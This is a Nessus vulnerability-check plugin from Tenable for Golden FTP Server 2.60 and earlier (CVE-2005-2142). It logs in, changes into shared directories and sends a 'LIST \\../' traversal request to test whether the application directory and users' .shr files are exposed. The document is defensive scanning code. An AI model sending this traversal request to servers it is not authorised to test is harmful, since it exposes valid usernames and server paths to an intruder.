#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(18615);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2005-2142");
  script_bugtraq_id(14124);
  script_xref(name:"OSVDB", value:"17678");

  script_name(english:"Golden FTP Server <= 2.60 LS Command Traversal Information Disclosure");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by information disclosure flaws." );
 script_set_attribute(attribute:"description", value:
"The version of Golden FTP Server installed on the remote host is prone
to multiple information disclosure vulnerabilities.  Specifically, an
authenticated attacker can list the contents of the application
directory, which provides a list of valid users, and learn the
absolute path of any shared directories." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Golden FTP Server 2.70 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
script_end_attributes();

 
  script_summary(english:"Checks for information disclosure vulnerabilities in Golden FTP Server <= 2.60");
  script_category(ACT_ATTACK);
  script_family(english:"FTP");
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
  script_dependencie("find_service1.nasl", "ftpserver_detect_type_nd_version.nasl", "ftp_overflow.nasl");
  script_require_keys("ftp/login", "ftp/password");
#  script_exclude_keys("ftp/false_ftp", "ftp/msftpd", "ftp/ncftpd", "ftp/fw1ftpd", "ftp/vxftpd");
  script_require_ports("Services/ftp", 21);

  exit(0);
}


include("ftp_func.inc");
include('global_settings.inc');


# nb: to exploit the vulnerability we need to log in.
user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");
if (!user || !pass) {
  exit(0, "ftp/login and/or ftp/password are empty");
}


port = get_kb_item("Services/ftp");
if (!port) port = 21;
if (!get_port_state(port)) exit(0);

soc = open_sock_tcp(port);
if (!soc) exit(0);
if (!ftp_authenticate(socket:soc,  user:user, pass:pass)) {
  close(soc);
  exit(1, "cannot login with supplied ftp credentials");
}


# Make sure it's Golden FTP Server.
c = string("SYST");
send(socket:soc, data:string(c, "\r\n"));
s = recv_line(socket:soc, length:4096);
if ("215 WIN32" >!< s) exit(0);


port2 = ftp_pasv(socket:soc);
if (!port2) exit(0);
soc2 = open_sock_tcp(port2, transport:ENCAPS_IP);
if (!soc2) exit(0);

# Identify shared directories on the remote.
c = string("LIST /");
send(socket:soc, data:string(c, "\r\n"));
s = recv_line(socket:soc, length:4096);
if (s =~ "^1[0-9][0-9] ") {
  listing = ftp_recv_listing(socket:soc2);
  s = recv_line(socket:soc, length:4096);
}
close(soc2);
ndirs = 0;
foreach line (split(listing, keep:FALSE)) {
  if (line =~ "^d") {
    # nb: dirs may have spaces so we can't just use a simple regex.
    dirs[ndirs] = substr(line, 55);

    # 3 directories should be enough for testing.
    if (++ndirs > 3) break;
  }
}


# Try to exploit the vulnerability.
foreach dir (dirs) {
  # Change into the directory.
  c = string("CWD /", dir);
  send(socket:soc, data:string(c, "\r\n"));
  s = ftp_recv_line(socket:soc);
  if (egrep(string:s, pattern:"^250[ -]")) {
    port2 = ftp_pasv(socket:soc);
    if (!port2) exit(0);
    soc2 = open_sock_tcp(port2, transport:ENCAPS_IP);
    if (!soc2) exit(0);

    # Look for contents of the application directory.
    c = string("LIST \\../");
    send(socket:soc, data:string(c, "\r\n"));
    s = ftp_recv_line(socket:soc);
    if (egrep(string:s, pattern:"^1[0-9][0-9][ -]")) {
      listing = ftp_recv_listing(socket:soc2);
      s = recv_line(socket:soc, length:4096);

      # There's a problem if we see the .shr file for our username.
      if (string(" ", user, ".shr") >< listing) {
        security_warning(port);
        break;
      }
    }

    close(soc2);
  }
}


# Close the connections.
ftp_close(socket:soc);
